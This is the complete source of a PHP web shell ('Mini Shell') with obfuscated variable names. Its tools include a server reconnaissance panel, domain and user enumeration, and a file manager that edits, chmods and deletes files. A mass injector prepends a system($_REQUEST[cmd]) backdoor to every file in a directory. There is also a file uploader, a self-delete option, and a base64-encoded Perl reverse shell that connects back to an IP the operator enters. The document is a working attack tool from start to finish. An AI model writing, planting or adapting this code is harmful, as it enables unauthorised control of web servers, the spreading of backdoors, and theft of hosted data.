<!DOCTYPE html>
<html>
	<head>
		<?php error_reporting(0);?>
		<title>Mini Shell</title>
		<meta charset="UTF-8" />
		<meta name="description" content="" />
		<meta name="note" content="Changing The Names Wont Make You The Author :)" />
		<meta http-equiv="refresh" content=""><!-- For Refreshing Page After 3600 Intervals of time -->
		<meta name="about" content="Use it where other shells dont work" />
		<meta name="revisit-after" content="1800" />
		<meta name="language" content="en" />
		<meta content='general' name='rating' />
		<meta content='google' name='generator' />
		<meta content='follow,all' name='msnbot' />
		<meta content='follow,all' name='alexabot' />
		<meta content='pakistan' name='geo.placename' />
		<meta content="index,follow,all" name="googlebot" />
		<meta http-equiv="X-UA-Compatible" content="IE-edge" />
		<link rel="SHORTCUT ICON" href="http://i.imgur.com/Ix3lhWm.jpg" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<meta name='search engines' content='Aeiwi,Alexa,AllTheWeb,AltaVista,AOLNetfind,Anzwers,Canada,DirectHit,EuroSeek,Excite,Overture,Go,Google,HotBot InfoMak,Kanoodle,Lycos,MachineSite,National Directory,Northern Light,SearchIt,SimpleSearch,WebsMostLinked,WebTop,What-U-Seek,AOL,Yahoo,WebCrawler,Infoseek,Excite,Magellan,LookSmart,bing,CNET,Googlebot' />
		<style>
			body {
				background-color: black;
			}
			.heading {
				text-align: center;
				font-size: 300%;
				font-family: cursive;
				color: red;
			}
			.buttons {
				margin-top: 2vh;
			}
			input {
				color: white;
				text-align: center;
				font-weight: bold; 
				font-family: cursive;
				border-left: black;
				border-right: black;
				border-style: groove;
				background-color: black; 
				font-size: 110%;
			}
			select {
				color: white;
				text-align: center;
				font-weight: bold; 
				font-family: cursive;
				border-left: black;
				border-right: black;
				border-style: groove;
				background-color: black;
			}
			option {
				color: white;
				text-align: center;
				font-weight: bold; 
				font-family: cursive;
				border-left: black;
				border-right: black;
				border-style: groove;
				background-color: black; 
			}
			textarea {
				color: white;
				font-weight: bold; 
				font-family: cursive;
				border-left: black;
				border-right: black;
				border-style: groove;
				background-color: black; 
			}
			a {
				text-decoration: none;
				color: white;
			}
			a:hover {
				text-decoration: none;
				color: teal;
			}
			.footer {
				position: fixed;
				left: 0px;
				right: 0px;
				bottom: 1vh;
				color: red;
				font-family: cursive;
				font-size: 160%;
				text-align: center;
			}
		</style>
	</head>
	<body>
		<div class="heading">
			<font>Mini Shell</font><br>
		</div>
		<div class="buttons"><center>
			<a href="?server_info">
				<input type="submit" value="Server Info" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?file_manager">
				<input type="submit" value="File Manager" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?php_info">
				<input type="submit" value="Php Info" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?mass_injector">
				<input type="submit" value="Code Injector" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?uploader">
				<input type="submit" value="Uploader" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?domains">
				<input type="submit" value="Domains" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?back_connecter">
				<input type="submit" value="Back Connecter" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?die">
				<input type="submit" value="Die" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			</center>
			<?php
if (isset($_GET['server_info'])) {?>
						<center><br><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">Uname: <?php echo php_uname(); ?></font><br>
						<font style="color: silver; font-family: cursive; font-size: 130%;">Browser: <?php echo $_SERVER['HTTP_USER_AGENT']; ?></font><br>
						<font style="color: lawngreen; font-family: cursive; font-size: 130%;">Server Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?> </font><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">Server IP: <?php echo $_SERVER['SERVER_ADDR']; ?></font><br>
						<font style="color: lawngreen; font-family: cursive; font-size: 130%;">User IP: <?php echo $_SERVER['REMOTE_ADDR']; ?></font><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">User: <?php echo @get_current_user(); ?></font><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">Safe Mode:&nbsp;<?php $_ee24408cd02b = ini_get('safe_mode'); if ($_ee24408cd02b == 1) { echo '<span style="color: red;">On';} else {echo '<span style="color: lawngreen;">Off</span>';}?>
						</font><br>
						<font style="color: lawngreen; font-family: cursive; font-size: 130%;">Domains: <?php if(strtolower(substr(PHP_OS,0,3)) == "win") {$_f3d329025a5d = 'win';}else {$_f3d329025a5d = 'nix';}if($_f3d329025a5d == 'nix') {$_1a1142d4b381 = @file_get_contents("/etc/named.conf");if(!$_1a1142d4b381) {$_b9c59d921b4e = "/var/named";$_011c7db1e205 = scandir($_b9c59d921b4e);$_0d88a9bd4c27 = count($_011c7db1e205);} else {@preg_match_all('/.*?zone "(.*?)" {/', $_1a1142d4b381, $_1765c46dda35);$_1765c46dda35 = sizeof(array_unique($_1765c46dda35[1])); $_0d88a9bd4c27 = $_1765c46dda35."  Domains";}} else {$_0d88a9bd4c27 = "1";} echo $_0d88a9bd4c27; }?>
					</center></font></center>
			<?php
if (isset($_GET['file_manager'])) {echo '<!DOCTYPE HTML>
						<HTML>
						<HEAD>
						<link href="" rel="stylesheet" type="text/css">
						<title>File Manager</title>
						<style>
						body{
						    color: white;
						    font-family: "Racing Sans One", cursive;
						    background-color: black;
						    text-shadow:0px 0px 1px black;
						}
						#content tr:hover{
						    background-color: white;
						    text-shadow:0px 0px 10px white;
						}
						#content .first{
						    background-color: silver;
						}
						#content .first:hover{
						    background-color: silver;
						    text-shadow:0px 0px 1px #757575;
						}
						table{
						    border: 1px white dotted;
						}
						H1{
						    font-family: "Rye", cursive;
						    color: white;
						}
						a{
						    color: white;
						    text-decoration: none;
						}
						a:hover{
						    color: red;
						    text-shadow:0px 0px 10px #ffffff;
						}
						pre {
							color: white;
							font-family: cursive;
							font-size: 100%;
						}
						input,select,textarea{
										color: white;
										text-align: center;
										font-weight: bold; 
										font-family: cursive;
										border-left: black;
										border-right: black;
										border-style: groove;
										background-color: black; 
										font-size: 110%;
						}
						</style>
						</HEAD>
						<BODY>
						<H1><center>File Manager</center></H1>
						<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
						<tr><td><font style="color:white;">Current Path : ';$_d586cea720c2 = getcwd();$_d586cea720c2 = str_replace('\\','/',$_d586cea720c2);$_19eaea116b65 = explode('/',$_d586cea720c2);function permsa($_db30bcba387e){$_62756ced6cca = fileperms($_db30bcba387e);if (($_62756ced6cca & 0xC000) == 0xC000) {$_c889a0d2bbd1 = 's';} elseif (($_62756ced6cca & 0xA000) == 0xA000) {$_c889a0d2bbd1 = 'l';} elseif (($_62756ced6cca & 0x8000) == 0x8000) {$_c889a0d2bbd1 = '-';} elseif (($_62756ced6cca & 0x6000) == 0x6000) {$_c889a0d2bbd1 = 'b';} elseif (($_62756ced6cca & 0x4000) == 0x4000) {$_c889a0d2bbd1 = 'd';} elseif (($_62756ced6cca & 0x2000) == 0x2000) {$_c889a0d2bbd1 = 'c';} elseif (($_62756ced6cca & 0x1000) == 0x1000) {$_c889a0d2bbd1 = 'p';} else {$_c889a0d2bbd1 = 'u';}$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0100) ? 'r' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0080) ? 'w' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0040) ?(($_62756ced6cca & 0x0800) ? 's' : 'x' ) :(($_62756ced6cca & 0x0800) ? 'S' : '-'));$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0020) ? 'r' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0010) ? 'w' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0008) ?(($_62756ced6cca & 0x0400) ? 's' : 'x' ) :(($_62756ced6cca & 0x0400) ? 'S' : '-'));$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0004) ? 'r' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0002) ? 'w' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0001) ?(($_62756ced6cca & 0x0200) ? 't' : 'x' ) :(($_62756ced6cca & 0x0200) ? 'T' : '-'));return $_c889a0d2bbd1;}foreach($_19eaea116b65 as $_fb685115b91f=>$_e3beccd8d39e){ if($_e3beccd8d39e == '' && $_fb685115b91f == 0){ $_3c0a4563959e = true; echo '<a href="?file_manager&path=/">/</a>'; continue; } if($_e3beccd8d39e == '') continue; echo '<a href="?file_manager&path='; for($_bad1b53b4fbb=0;$_bad1b53b4fbb<=$_fb685115b91f;$_bad1b53b4fbb++){ echo "$_19eaea116b65[$_bad1b53b4fbb]"; if($_bad1b53b4fbb != $_fb685115b91f) echo "/"; } echo '">'.$_e3beccd8d39e.'</a>/';}echo '</td></tr><tr><td>'; if(isset($_GET['filesrc'])){ echo "<tr><td>Current File : "; echo $_GET['filesrc']; echo '</tr></td></table><br />'; echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){ echo '</table><br /><center>'.$_POST['path'].'<br /><br />'; if($_POST['opt'] == 'chmod'){ if(isset($_POST['perm'])){ if(chmod($_POST['path'],$_POST['perm'])){ echo '<font color="green">Change Permission Done.</font><br />'; }else{ echo '<font color="red">Change Permission Error.</font><br />'; } } echo '<form method="POST">
						        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
						        <input type="hidden" name="path" value="'.$_POST['path'].'">
						        <input type="hidden" name="opt" value="chmod">
						        <input type="submit" value="Go" />
						        </form>'; }elseif($_POST['opt'] == 'rename'){ if(isset($_POST['newname'])){ if(rename($_POST['path'],$_d586cea720c2.'/'.$_POST['newname'])){ echo '<font color="green">Change Name Done.</font><br />'; }else{ echo '<font color="red">Change Name Error.</font><br />'; } $_POST['name'] = $_POST['newname']; } echo '<form method="POST">
						        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
						        <input type="hidden" name="path" value="'.$_POST['path'].'">
						        <input type="hidden" name="opt" value="rename">
						        <input type="submit" value="Go" />
						        </form>'; }elseif($_POST['opt'] == 'edit'){ if(isset($_POST['src'])){ $_ba2773181c57 = fopen($_POST['path'],'w'); if(fwrite($_ba2773181c57,$_POST['src'])){ echo '<font color="green">Edit File Done.</font><br />'; }else{ echo '<font color="red">Edit File Error.</font><br />'; } fclose($_ba2773181c57); } echo '<form method="POST">
						        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
						        <input type="hidden" name="path" value="'.$_POST['path'].'">
						        <input type="hidden" name="opt" value="edit">
						        <input type="submit" value="Go" />
						        </form>'; } echo '</center>';}else{ echo '</table><br /><center>'; if(isset($_GET['option']) && $_POST['opt'] == 'delete'){ if($_POST['type'] == 'dir'){ if(rmdir($_POST['path'])){ echo '<font color="green">Delete Dir Done.</font><br />'; }else{ echo '<font color="red">Delete Dir Error.</font><br />'; } }elseif($_POST['type'] == 'file'){ if(unlink($_POST['path'])){ echo '<font color="green">Delete File Done.</font><br />'; }else{ echo '<font color="red">Delete File Error.</font><br />'; } } } echo '</center>'; $_b1faba4eea56 = scandir($_d586cea720c2); echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
						    <tr class="first">
						        <td><center>Name</center></td>
						        <td><center>Size</center></td>
						        <td><center>Permissions</center></td>
						        <td><center>Options</center></td>
						    </tr>'; foreach($_b1faba4eea56 as $_2ac452f67253){ if(!is_dir("$_d586cea720c2/$_2ac452f67253") || $_2ac452f67253 == '.' || $_2ac452f67253 == '..') continue; echo "<tr>
						        <td><a href=\"?file_manager&path=$_d586cea720c2/$_2ac452f67253\">$_2ac452f67253</a></td>
						        <td><center>--</center></td>
						        <td><center>"; if(is_writable("$_d586cea720c2/$_2ac452f67253")) echo '<font color="green">'; elseif(!is_readable("$_d586cea720c2/$_2ac452f67253")) echo '<font color="red">'; echo permsa("$_d586cea720c2/$_2ac452f67253"); if(is_writable("$_d586cea720c2/$_2ac452f67253") || !is_readable("$_d586cea720c2/$_2ac452f67253")) echo '</font>'; echo "</center></td>
						        <td><center><form method=\"POST\" action=\"?file_manager&option&path=$_d586cea720c2\">
						        <select name=\"opt\">
						        <option value=\"\"></option>
						        <option value=\"delete\">Delete</option>
						        <option value=\"chmod\">Chmod</option>
						        <option value=\"rename\">Rename</option>
						        </select>
						        <input type=\"hidden\" name=\"type\" value=\"dir\">
						        <input type=\"hidden\" name=\"name\" value=\"$_2ac452f67253\">
						        <input type=\"hidden\" name=\"path\" value=\"$_d586cea720c2/$_2ac452f67253\">
						        <input type=\"submit\" value=\">\" />
						        </form></center></td>
						        </tr>"; } echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>'; foreach($_b1faba4eea56 as $_db30bcba387e){ if(!is_file("$_d586cea720c2/$_db30bcba387e")) continue; $_77eb295f75fe = filesize("$_d586cea720c2/$_db30bcba387e")/1024; $_77eb295f75fe = round($_77eb295f75fe,3); if($_77eb295f75fe >= 1024){ $_77eb295f75fe = round($_77eb295f75fe/1024,2).' MB'; }else{ $_77eb295f75fe = $_77eb295f75fe.' KB'; } echo "<tr>
						        <td><a href=\"?file_manager&filesrc=$_d586cea720c2/$_db30bcba387e&path=$_d586cea720c2\">$_db30bcba387e</a></td>
						        <td><center>".$_77eb295f75fe."</center></td>
						        <td><center>"; if(is_writable("$_d586cea720c2/$_db30bcba387e")) echo '<font color="green">'; elseif(!is_readable("$_d586cea720c2/$_db30bcba387e")) echo '<font color="red">'; echo permsa("$_d586cea720c2/$_db30bcba387e"); if(is_writable("$_d586cea720c2/$_db30bcba387e") || !is_readable("$_d586cea720c2/$_db30bcba387e")) echo '</font>'; echo "</center></td>
						        <td><center><form method=\"POST\" action=\"?file_manager&option&path=$_d586cea720c2\">
						        <select name=\"opt\">
						        <option value=\"\"></option>
						        <option value=\"delete\">Delete</option>
						        <option value=\"chmod\">Chmod</option>
						        <option value=\"rename\">Rename</option>
						        <option value=\"edit\">Edit</option>
						        </select>
						        <input type=\"hidden\" name=\"type\" value=\"file\">
						        <input type=\"hidden\" name=\"name\" value=\"$_db30bcba387e\">
						        <input type=\"hidden\" name=\"path\" value=\"$_d586cea720c2/$_db30bcba387e\">
						        <input type=\"submit\" value=\">\" />
						        </form></center></td>
						        </tr>"; } echo '</table>
						    </div><br><br><br>';}echo '
						</BODY>
						</HTML>';}?>
			<?php
if (isset($_GET['php_info'])) {?>
					<body style="color: black; background-color: black;">
					<font style="background-color: black; color: black;">
					<a style="color: black;">
					<?php phpinfo(); echo '<br><br><br>';}?>
					<?php ?>
			<?php
if (isset($_GET['file_creator'])) {?>
					<center><br><br>
					<form action="" method="POST">
						<font color="white" face="cursive" size="">Filename: </font>
						<input type="text" name="file_name" placeholder="File Name Here" /><br><br>
						<font color="white" face="cursive" size="">Content: </font><br>
						<textarea name="content_of_files" rows="10" cols="90"></textarea><br><br>
						<input type="submit" name="submissionoffilecreator" value="Submit" />
					</form>
					<?php
$_5eb61fd12eed = $_POST['file_name'];$_0adc62b31334 = $_POST['content_of_files'];if (isset($_POST['file_name']) || isset($_POST['content_of_files']) || isset($_POST['submissionoffilecreator'])) {if (!empty($_5eb61fd12eed) || !empty($_0adc62b31334)) {$_84c54f971273 = @fopen($_5eb61fd12eed, 'w');@fwrite($_84c54f971273, $_0adc62b31334);@fclose($_84c54f971273);?><br><br>
						<font color="white" face="cursive" size="5">File With Name: <a href="<?php echo $_5eb61fd12eed; ?>" target="_blank"><?php echo $_5eb61fd12eed; ?></a> is created</font>
						<?php } else {?><br><br>
							<font color="white" face="cursive" size="5">Please Input In All Fields :P</font>
							<?php
}}}?>
					<?php
if (isset($_GET['mass_injector'])) {?><br><center><br>
							<font style="color: teal; font-family: cursive; font-size: 200%;">ReV Mass Code Injector V2.0</font><br><br>
							<form action="" method="POST">
			<?php
$_ec5b37e72301 = '
<?php
if (isset($_REQUEST[cmd])) {
system ($_REQUEST[cmd]);
}
?>';?>
				<textarea type="text" name="code" rows="13" cols="80" placeholder="Enter Your Code Like This : <?php echo $_ec5b37e72301; ?>"></textarea><br><br>
				<input style="font-family: Comic Sans Ms; font-size: 90%;" type="submit" name="submit" value="Submit" />
			</form>
			<?php
if (isset($_POST['submit'])) {$_e04f8301a9f1 = $_POST['code'];$_9f7af403d39c = base64_encode($_e04f8301a9f1);$_d586cea720c2 = getcwd();$_959a28065435 = 'http://'.$_SERVER['HTTP_HOST'];$_da84e8d0e5e8 = $_SERVER['SCRIPT_NAME'];$_d394e1453852 = $_959a28065435.$_da84e8d0e5e8;$_d586cea720c2 = getcwd();$_3528fced53a2 = $_d586cea720c2;if (empty($_e04f8301a9f1)) {echo '<font size=\'50%\' face=\'cursive\' color=\'red\'>You need to input something !!! :P</font>';}if (!empty($_e04f8301a9f1)) {if ($_84c54f971273 = opendir($_3528fced53a2)) {echo 'Website: '.$_d394e1453852.'<br><br>';echo 'Looking in '.$_3528fced53a2.'<br>';while ($_fb803b5db2a0 = readdir($_84c54f971273)) {if ($_fb803b5db2a0 != '.' && $_fb803b5db2a0 != '..' && $_fb803b5db2a0 != 'rev.php' && $_fb803b5db2a0 != 'REV.php' && $_fb803b5db2a0 != '.htaccess' && $_fb803b5db2a0 != 'php.ini' && $_fb803b5db2a0 != 'admin' && $_fb803b5db2a0 != 'images' && $_fb803b5db2a0 != 'image' && $_fb803b5db2a0 != 'img' && $_fb803b5db2a0 != 'phpmyadmin' && $_fb803b5db2a0 != 'files' && $_fb803b5db2a0 != '.ftpquota' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'xml' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'jpg' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'ico' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'png' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'jpeg' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'txt' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'exe' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'html' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'shtml' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'htm' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'ico' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'css' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'zip' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'sql' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'js' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'py' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'pl' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'md' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'gif' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'tar.gz' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'c' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'sql.zip' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'out') {echo '<a style="color: red; font-family: cursive;" target="_blank" href="'.$_fb803b5db2a0.'">'.$_fb803b5db2a0.'</a><font size="" color="lawngreen" face="cursive">&nbsp;&nbsp;&nbsp&nbsp;Is Injected</font><br />';$_c4f3394d1c6c = base64_decode($_9f7af403d39c);$_c4f3394d1c6c .= file_get_contents($_fb803b5db2a0);file_put_contents($_fb803b5db2a0, $_c4f3394d1c6c); echo '<br><br><br>';} }}}}}?>
		<?php
if (isset($_GET['uploader'])) {?>
				<center><br><br>
				<font style="color: lawngreen; font-family: cursive; font-size: 250%;">Uploader</font><br><br><br><br>
				<form method="POST" enctype="multipart/form-data" action="">
					<input style="font-size: 90%;" type="file" name="files">
					<input style="font-size: 90%;" type=submit value="Upload">
				</form>
				<?php
$_fb803b5db2a0 = @$_FILES["files"];if ($_fb803b5db2a0["name"] != '') { $_73a9599617ef = $_REQUEST["path"] . $_fb803b5db2a0["name"]; if (move_uploaded_file($_fb803b5db2a0['tmp_name'], $_73a9599617ef)) { echo "<center><br><br><font style='color: red; font-family: cursive; font-size: 200%;'><a href='$_73a9599617ef' target='_blank'>Click to access uploaded File</a></font></center>"; }}?>
				<?php
}?>
		<?php
?>
		<font style="color: white; font-family: cursive; font-size: 100%;">
		<?php
if (isset($_GET['domains'])) { if(strtolower(substr(PHP_OS,0,3)) == "win") {$_f3d329025a5d = 'win';}else {$_f3d329025a5d = 'nix';} if ($_f3d329025a5d == 'win') {?>
				<center><br><br>
					<font style="color: white; font-family: cursive; font-size: 200%;">Ooopppss Windows Server :P<br>You Better Find Linux :P </font>
				</center><?php
}else {if (isset($_GET['domains'])) {$_db30bcba387e = @implode(@file("/etc/named.conf"));$_549674eea689 = "/var/named";if (!$_db30bcba387e) {$_fb0dd6286113 = scandir($_549674eea689);$_74ba591cb2f1=1;$_cbd11b654fbf = 0; echo "<table align=center border=1 width=59% cellpadding=5>
					<tr><td colspan=2><center>There are : ( <b>" . count($_fb0dd6286113) . "</b> ) Domains in this Sever.</center></td></tr>
					<tr><td>No</td><td>Domain</td><td>User</td></tr>";foreach ($_fb0dd6286113 as &$_abf6e8a6ebfa) { if (stripos($_abf6e8a6ebfa,".db")) { $_abf6e8a6ebfa = str_replace('.db','',$_abf6e8a6ebfa); } if (strlen($_abf6e8a6ebfa) > 6) { echo "<tr><td>".$_74ba591cb2f1++."</td><td><a href='http://".$_abf6e8a6ebfa."' target='_blank'>".$_abf6e8a6ebfa."</a></td><td>User</td></tr>"; } } echo "</table>";} else{ $_74ba591cb2f1 = 1; preg_match_all("#named/(.*?).db#", $_db30bcba387e, $_6fb5fe1b7448); $_fb0dd6286113 = array_unique($_6fb5fe1b7448[1]); echo "<table align=center border=1 width=59% cellpadding=5>
					<tr><td colspan=2> There are  ( <b>" . count($_fb0dd6286113) . "</b> ) Domains in this Sever.I think you have got something this time yeah!!!.</td></tr>
					<tr><td>No</td><td>Domain</td><td>User</td></tr>"; foreach ($_fb0dd6286113 as $_abf6e8a6ebfa) { $_1653139bda87 = posix_getpwuid(@fileowner("/etc/valiases/" . $_abf6e8a6ebfa)); echo "<tr><td>".$_74ba591cb2f1++."</td><td><a href='http://".$_abf6e8a6ebfa."' target='_blank'>".$_abf6e8a6ebfa."</a></td><td>".$_1653139bda87['name']."</td></tr>"; ?> </font><br><br><br> <?php
 }}} } }?>
		<?php
if (isset($_GET['back_connecter'])) {$_0c5e3246e473="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";echo "<center><br><br><form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\" method='POST'><span style='font-family: cursive; font-size: 200%; color: white;'>Back-Connecter Via Perl</span><br/><br>Your Ip: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'><br><br> Port to bind: <input type='text' name='port' value='110'><br><br><input type=submit name='backconnect' value='Submit'></form><br>";if(isset($_POST['backconnect'])) {function cf($_e0887aa7bc0b,$_9c65822c9127) {$_dfb1f07e894f = @fopen($_e0887aa7bc0b,"w") or @function_exists('file_put_contents');if($_dfb1f07e894f){@fwrite($_dfb1f07e894f,@base64_decode($_9c65822c9127));@fclose($_dfb1f07e894f);}}function An0n3xPloiTeR($_6d1b263a32f3) {$_1765c46dda35 = '';if (function_exists('exec')) {@exec($_6d1b263a32f3,$_1765c46dda35);$_1765c46dda35 = @join("\n",$_1765c46dda35);} elseif (function_exists('passthru')) {ob_start();@passthru($_6d1b263a32f3);$_1765c46dda35 = ob_get_clean();} elseif (function_exists('system')) {ob_start();@system($_6d1b263a32f3);$_1765c46dda35 = ob_get_clean();} elseif (function_exists('shell_exec')) {$_1765c46dda35 = shell_exec($_6d1b263a32f3);} elseif (is_resource($_e0887aa7bc0b = @popen($_6d1b263a32f3,"r"))) {$_1765c46dda35 = "";while(!@feof($_e0887aa7bc0b))$_1765c46dda35 .= fread($_e0887aa7bc0b,1024);pclose($_e0887aa7bc0b);}return $_1765c46dda35;}if($_POST['backconnect']) {cf("/tmp/bc.pl",$_0c5e3246e473);$_1765c46dda35 = An0n3xPloiTeR("perl /tmp/bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &"); sleep(1);echo "<pre class=ml1>$_1765c46dda35\n".An0n3xPloiTeR("ps aux | grep bc.pl")."</pre>"; unlink("/tmp/bc.pl");}}}?>
		<?php
if (isset($_GET['die'])) {if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__))) {die('<!DOCTYPE html>
<html>
	<head>
		<style>
			.body {
			}
			.font {
				font-family: cursive;
				font-size: 300%;
				text-align: center;
				color: white;
			}
		</style>
	</head>
	<body class="body">
		<div class="font">
			<font><br><br>You Deleted Me :3<br>Now Fuck off :V</font>
		</div>
	</body>
</html>'); } ?>
					</span>
				</center>
				<?php
}?>
		</div>
		<div class="footer">
			<font>Developed By LameHacker</a></font>
		</div>
	</body>
</html>
